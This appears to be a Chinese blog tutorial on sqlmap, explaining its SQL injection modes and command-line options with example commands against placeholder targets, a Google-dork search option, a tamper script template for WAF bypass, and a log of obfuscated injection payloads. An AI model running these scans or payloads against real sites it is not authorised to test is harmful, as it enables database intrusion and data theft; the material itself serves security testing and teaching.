<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />













  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="SQL Injection,sqlmap" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />






<meta name="description" content="sqlmap的作用:  判断可注入的参数 判断可以用那种SQL注入技术来注入 识别出哪种数据库 根据用户选择，读取哪些数据  其支持5种模式的注入方式:  基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回">
<meta name="keywords" content="SQL Injection,sqlmap">
<meta property="og:type" content="article">
<meta property="og:title" content="sqlmap 使用指南">
<meta property="og:url" content="https://blog.nyrae.icu/blog/sqlmap/index.html">
<meta property="og:site_name" content="empty_xl Blog">
<meta property="og:description" content="sqlmap的作用:  判断可注入的参数 判断可以用那种SQL注入技术来注入 识别出哪种数据库 根据用户选择，读取哪些数据  其支持5种模式的注入方式:  基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2021-08-24T13:43:02.133Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="sqlmap 使用指南">
<meta name="twitter:description" content="sqlmap的作用:  判断可注入的参数 判断可以用那种SQL注入技术来注入 识别出哪种数据库 根据用户选择，读取哪些数据  其支持5种模式的注入方式:  基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: 'QT63IJTEZX',
      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
      indexName: 'blog.nyrae.icu',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.nyrae.icu/blog/sqlmap/"/>





  <title>sqlmap 使用指南 | empty_xl Blog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-90390918-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>










</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">empty_xl Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Hacked By_ emm myself?</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.nyrae.icu/blog/sqlmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="empty_xl">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="empty_xl Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">sqlmap 使用指南</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-29T12:05:43+08:00">
                2017-10-29
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">Post modified</span>
              
              <time title="Post modified" itemprop="dateModified" datetime="2021-08-24T21:43:02+08:00">
                2021-08-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web-security/" itemprop="url" rel="index">
                    <span itemprop="name">web security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><code>sqlmap</code>的作用:</p>
<ol>
<li>判断可注入的参数</li>
<li>判断可以用那种SQL注入技术来注入</li>
<li>识别出哪种数据库</li>
<li>根据用户选择，读取哪些数据</li>
</ol>
<p>其支持5种模式的注入方式:</p>
<ol>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
<li>联合查询注入，可以使用union的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<p>使用<code>-h -hh</code>可看到更为详细的帮助。</p>
<p>测试的来源可以是一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。</p>
<p>测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。</p>
<a id="more"></a>
<p><code>sqlmap</code>输出共有七个等级,默认为<code>1</code>,使用<code>-v</code>参数更改:</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>、只显示python错误以及严重的信息。</div><div class="line"></div><div class="line"><span class="number">1</span>、同时显示基本信息和警告信息。（默认）</div><div class="line"></div><div class="line"><span class="number">2</span>、同时显示debug信息。</div><div class="line"></div><div class="line"><span class="number">3</span>、同时显示注入的payload。</div><div class="line"></div><div class="line"><span class="number">4</span>、同时显示HTTP请求。</div><div class="line"></div><div class="line"><span class="number">5</span>、同时显示HTTP响应头。</div><div class="line"></div><div class="line"><span class="number">6</span>、同时显示HTTP响应页面。</div></pre></td></tr></table></figure>
<p>我们以<code>-hh</code>显示的参数来介绍常见参数:</p>
<h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><h4 id="target-目标"><a href="#target-目标" class="headerlink" title="target/目标"></a>target/目标</h4><h5 id="目标URL"><a href="#目标URL" class="headerlink" title="目标URL"></a>目标URL</h5><p><code>-u</code></p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">python</span> <span class="comment">sqlmap</span><span class="string">.</span><span class="comment">py</span> <span class="literal">-</span><span class="comment">u</span> <span class="comment">"http://www</span><span class="string">.</span><span class="comment">target</span><span class="string">.</span><span class="comment">com/vuln</span><span class="string">.</span><span class="comment">php?id=1"</span> <span class="literal">-</span><span class="comment">f</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">banner</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">dbs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">users</span></div></pre></td></tr></table></figure>
<h5 id="Burp或者WebScarab代理中获取日志"><a href="#Burp或者WebScarab代理中获取日志" class="headerlink" title="Burp或者WebScarab代理中获取日志"></a>Burp或者WebScarab代理中获取日志</h5><p><code>-l</code>  </p>
<p>可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。</p>
<h5 id="文本中获取多个目标扫描"><a href="#文本中获取多个目标扫描" class="headerlink" title="文本中获取多个目标扫描"></a>文本中获取多个目标扫描</h5><p> <code>-m</code></p>
<p>文件中每行存储一个目标</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">www.target<span class="number">1.</span>com/vul<span class="symbol">n1</span>.php?q=foobar</div><div class="line">www.target<span class="number">2.</span>com/vul<span class="symbol">n2</span>.asp?id=<span class="number">1</span></div><div class="line">www.target<span class="number">3.</span>com/vul<span class="symbol">n3</span>/id/<span class="number">1</span>*</div></pre></td></tr></table></figure>
<h5 id="文件中加载HTTP请求"><a href="#文件中加载HTTP请求" class="headerlink" title="文件中加载HTTP请求"></a>文件中加载HTTP请求</h5><p><code>-r</code></p>
<p>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/vuln.php</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: www.target.com</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0</div><div class="line"></div><div class="line"><span class="ini"><span class="attr">id</span>=<span class="number">1</span></span></div></pre></td></tr></table></figure>
<h5 id="处理google搜索结果"><a href="#处理google搜索结果" class="headerlink" title="处理google搜索结果"></a>处理google搜索结果</h5><p><code>-g</code></p>
<p>sqlmap可以测试注入Google的搜索结果中的GET参数</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -g <span class="string">"inurl:<span class="subst">\"</span>.php?id=1<span class="subst">\"</span>"</span></div></pre></td></tr></table></figure>
<h5 id="根据配置文件处理"><a href="#根据配置文件处理" class="headerlink" title="根据配置文件处理"></a>根据配置文件处理</h5><p><code>-c</code></p>
<p>根据<code>ini</code>文件中的内容进行配置</p>
<h4 id="Request-请求"><a href="#Request-请求" class="headerlink" title="Request/请求"></a>Request/请求</h4><h5 id="http方法"><a href="#http方法" class="headerlink" title="http方法"></a>http方法</h5><p><code>--method</code></p>
<p>更改http请求方法类型，如<code>put,connect</code>等</p>
<h5 id="http数据"><a href="#http数据" class="headerlink" title="http数据"></a>http数据</h5><p><code>--data</code><br>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">python</span> sqlmap.py -u <span class="string">"http://www.target.com/vuln.php"</span> --<span class="meta">data</span>=<span class="string">"id=1"</span> -f --<span class="keyword">banner </span>--dbs --users</div></pre></td></tr></table></figure>
<h5 id="参数拆分字符"><a href="#参数拆分字符" class="headerlink" title="参数拆分字符"></a>参数拆分字符</h5><p><code>--param-del</code><br>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">python</span> sqlmap.py -u <span class="string">"http://www.target.com/vuln.php"</span> --<span class="meta">data</span>=<span class="string">"query=foobar;id=1"</span> --param-del=<span class="string">";"</span> -f --<span class="keyword">banner </span>--dbs --users</div></pre></td></tr></table></figure>
<h5 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h5><p><code>--cookie,--load-cookies,--drop-set-cookie</code></p>
<p>这个参数在以下两个方面很有用：</p>
<ol>
<li>web应用需要登陆的时候。</li>
<li>你想要在这些头参数中测试SQL注入时。</li>
</ol>
<p>可以通过抓包把<code>cooki</code>e获取到，复制出来，然后加到–cookie参数里。  </p>
<p>在HTTP请求中，遇到<code>Set-Cookie</code>的话，<code>sqlmap</code>会自动获取并且在以后的请求中加入，并且会尝试<code>SQL注入</code>。  </p>
<p>如果你不想接受<code>Set-Cookie</code>可以使用<code>--drop-set-cookie</code>参数来拒接。  </p>
<p>当你使用<code>--cooki</code>e参数时，当返回一个<code>Set-Cookie头</code>的时候，sqlmap会询问你用哪个<code>cookie</code>来继续接下来的请求。当<code>--level</code>的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。  </p>
<h5 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h5><p><code>--user-agent,--random-agent</code></p>
<p>默认情况下sqlmap的HTTP请求头中User-Agent值是：<code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</code><br>可以使用<code>--user-anget</code>参数来修改，同时也可以使用<code>--random-agnet</code>参数来随机的从<code>./txt/user-agents.txt</code>中获取。</p>
<p>当<code>--level</code>参数设定为3或者3以上的时候，会尝试对<code>User-Angent</code>进行注入。</p>
<h5 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h5><p><code>--referer</code></p>
<p>sqlmap可以在请求中伪造HTTP中的<code>referer</code>，当–level参数设定为3或者3以上的时候会尝试对<code>referer</code>注入。<br>有些WAF会限制链接的跳转源，这时修改此字段就非常有必要。</p>
<h5 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h5><p><code>--headers</code></p>
<p>可以通过此参数来增加额外的http头</p>
<h5 id="HTTP请求延迟"><a href="#HTTP请求延迟" class="headerlink" title="HTTP请求延迟"></a>HTTP请求延迟</h5><p><code>--delay</code></p>
<p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
<h5 id="设定超时时间"><a href="#设定超时时间" class="headerlink" title="设定超时时间"></a>设定超时时间</h5><p><code>--timeout</code><br>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p>
<h5 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h5><p><code>--scope</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap<span class="selector-class">.py</span> -l burp<span class="selector-class">.log</span> --scope=<span class="string">"(www)?\.target\.(com|net|org)"</span></div></pre></td></tr></table></figure>
<h5 id="避免过多的错误请求被屏蔽"><a href="#避免过多的错误请求被屏蔽" class="headerlink" title="避免过多的错误请求被屏蔽"></a>避免过多的错误请求被屏蔽</h5><p><code>--safe-url,--safe-freq</code></p>
<p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。<br>1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>2、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p>
<h5 id="每次请求时候执行自定义的python代码"><a href="#每次请求时候执行自定义的python代码" class="headerlink" title="每次请求时候执行自定义的python代码"></a>每次请求时候执行自定义的python代码</h5><p><code>--eval</code><br>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用<code>--eval</code>参数在每次请求时根据所写python代码做完修改后请求。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b"</span> --<span class="built_in">eval</span>=<span class="string">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span></div></pre></td></tr></table></figure>
<p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p>
<h4 id="Injection-注入"><a href="#Injection-注入" class="headerlink" title="Injection/注入"></a>Injection/注入</h4><h5 id="测试参数"><a href="#测试参数" class="headerlink" title="测试参数"></a>测试参数</h5><p><code>-p</code></p>
<p><code>sqlmap</code>默认测试所有的<code>GET</code>和<code>POST</code>参数，当<code>--level</code>的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： <code>-p &quot;id,user-anget&quot;</code></p>
<p>当你使用<code>--level</code>的值很大但是有个别参数不想测试的时候可以使用–skip参数。</p>
<p>例如：<code>--skip=&quot;user-angent.referer&quot;</code></p>
<p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加<code>*</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://targeturl/param1/value1*/param2/value2/"</span></div><div class="line"></div><div class="line">sqlmap将会测试value1的位置是否可注入。</div></pre></td></tr></table></figure>
<h5 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h5><p><code>--dbms</code></p>
<p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft <span class="keyword">Access</span>、SQLite、Firebird、Sybase、SAP MaxDB、DB2</div></pre></td></tr></table></figure>
<h5 id="指定数据库服务器系统"><a href="#指定数据库服务器系统" class="headerlink" title="指定数据库服务器系统"></a>指定数据库服务器系统</h5><p><code>--os</code><br>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：<code>Linux、Windows</code>。</p>
<h5 id="指定无效的大数字"><a href="#指定无效的大数字" class="headerlink" title="指定无效的大数字"></a>指定无效的大数字</h5><p><code>--invalid-bignum</code></p>
<p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，<code>sqlmap</code>会变成id=-13来报错，你可以指定比如id=9999999来报错。</p>
<h5 id="指定无效的逻辑"><a href="#指定无效的逻辑" class="headerlink" title="指定无效的逻辑"></a>指定无效的逻辑</h5><p><code>--invalid-logical</code><br>可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。</p>
<h5 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h5><p><code>--prefix,--suffix</code><br>在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p>
<p>例如：</p>
<p>例如，代码中是这样调用数据库的：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(’<span class="string">" . $_GET[’id’] . "</span>’) <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">";</span></div></pre></td></tr></table></figure>
<p>这时你就需要<code>--prefix</code>和<code>--suffix</code>参数了：</p>
<p>这样执行的SQL语句变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(’<span class="number">1</span>’) &lt;PAYLOAD&gt; <span class="keyword">AND</span> (’abc’=’abc’) <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span><span class="string">";</span></div></pre></td></tr></table></figure>
<h5 id="修改注入的数据"><a href="#修改注入的数据" class="headerlink" title="修改注入的数据"></a>修改注入的数据</h5><p><code>--tamper</code></p>
<p>sqlmap除了使用<code>CHAR()</code>函数来防止出现单引号之外没有对注入的数据修改，你可以使用–tamper参数对数据做修改来绕过WAF等设备。</p>
<p>下面是一个tamper脚本的格式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Needed imports</span></div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"><span class="comment"># Define which is the order of application of tamper scripts against</span></div><div class="line"><span class="comment"># the payload</span></div><div class="line">__priority__ = PRIORITY.NORMAL</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line">    Description of your tamper script</div><div class="line">    '''</div><div class="line">    retVal = payload</div><div class="line">    <span class="comment"># your code to tamper the original payload</span></div><div class="line">    <span class="comment"># return the tampered payload</span></div><div class="line">    <span class="keyword">return</span> retVal</div></pre></td></tr></table></figure>
<p>常用的tamper都在<code>/tamper</code>目录下：</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1"</span> <span class="comment">--tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span></div><div class="line"></div><div class="line">[hh:mm:<span class="number">03</span>] [DEBUG] cleaning up <span class="keyword">configuration</span> parameters</div><div class="line">[hh:mm:<span class="number">03</span>] [INFO] loading tamper script <span class="symbol">'between</span>'</div><div class="line">[hh:mm:<span class="number">03</span>] [INFO] loading tamper script <span class="symbol">'randomcase</span>'</div><div class="line">[hh:mm:<span class="number">03</span>] [INFO] loading tamper script <span class="symbol">'space2comment</span>'</div><div class="line">[...]</div><div class="line">[hh:mm:<span class="number">04</span>] [INFO] testing <span class="symbol">'AND</span> <span class="built_in">boolean</span>-based blind - WHERE <span class="keyword">or</span> HAVING clause'</div><div class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span>)<span class="comment">/**/</span><span class="keyword">And</span><span class="comment">/**/</span><span class="number">1369</span>=<span class="number">7706</span><span class="comment">/**/</span><span class="keyword">And</span><span class="comment">/**/</span>(<span class="number">4092</span>=<span class="number">4092</span></div><div class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span>)<span class="comment">/**/</span><span class="keyword">AND</span><span class="comment">/**/</span><span class="number">9267</span>=<span class="number">9267</span><span class="comment">/**/</span><span class="keyword">AND</span><span class="comment">/**/</span>(<span class="number">4057</span>=<span class="number">4057</span></div><div class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span><span class="comment">/**/</span><span class="keyword">AnD</span><span class="comment">/**/</span><span class="number">950</span>=<span class="number">7041</span></div><div class="line">[...]</div><div class="line">[hh:mm:<span class="number">04</span>] [INFO] testing <span class="symbol">'MySQL</span> &gt;= <span class="number">5.0</span> <span class="keyword">AND</span> <span class="literal">error</span>-based - WHERE <span class="keyword">or</span> HAVING clause'</div><div class="line">[hh:mm:<span class="number">04</span>] [PAYLOAD] <span class="number">1</span><span class="comment">/**/</span><span class="keyword">anD</span><span class="comment">/**/</span>(<span class="keyword">SELeCt</span><span class="comment">/**/</span><span class="number">9921</span><span class="comment">/**/</span>fROm(<span class="keyword">SELeCt</span><span class="comment">/**/</span>counT(*),CONCAT(cHar(</div><div class="line"><span class="number">58</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">107</span>,<span class="number">58</span>),(<span class="keyword">SELeCt</span><span class="comment">/**/</span>(<span class="keyword">case</span><span class="comment">/**/</span><span class="keyword">whEN</span><span class="comment">/**/</span>(<span class="number">9921</span>=<span class="number">9921</span>)<span class="comment">/**/</span><span class="keyword">THeN</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">elsE</span><span class="comment">/**/</span><span class="number">0</span><span class="comment">/**/</span></div><div class="line"><span class="keyword">ENd</span>)),cHar(<span class="number">58</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">104</span>,<span class="number">58</span>),FLOOR(RanD(<span class="number">0</span>)*<span class="number">2</span>))x<span class="comment">/**/</span>fROm<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span></div><div class="line"><span class="keyword">group</span><span class="comment">/**/</span>bY<span class="comment">/**/</span>x)a)</div><div class="line">[hh:mm:<span class="number">04</span>] [INFO] GET parameter <span class="symbol">'id</span>' <span class="keyword">is</span> <span class="symbol">'MySQL</span> &gt;= <span class="number">5.0</span> <span class="keyword">AND</span> <span class="literal">error</span>-based - WHERE <span class="keyword">or</span> HAVING</div><div class="line">clause' injectable</div><div class="line">[...]</div></pre></td></tr></table></figure>
<h4 id="Detection-探测"><a href="#Detection-探测" class="headerlink" title="Detection/探测"></a>Detection/探测</h4><h5 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h5><p><code>--level</code></p>
<p>共有五个等级，默认为1，sqlmap使用的payload可以在<code>xml/payloads.xml</code>中看到，你也可以根据相应的格式添加自己的<code>payload</code>。</p>
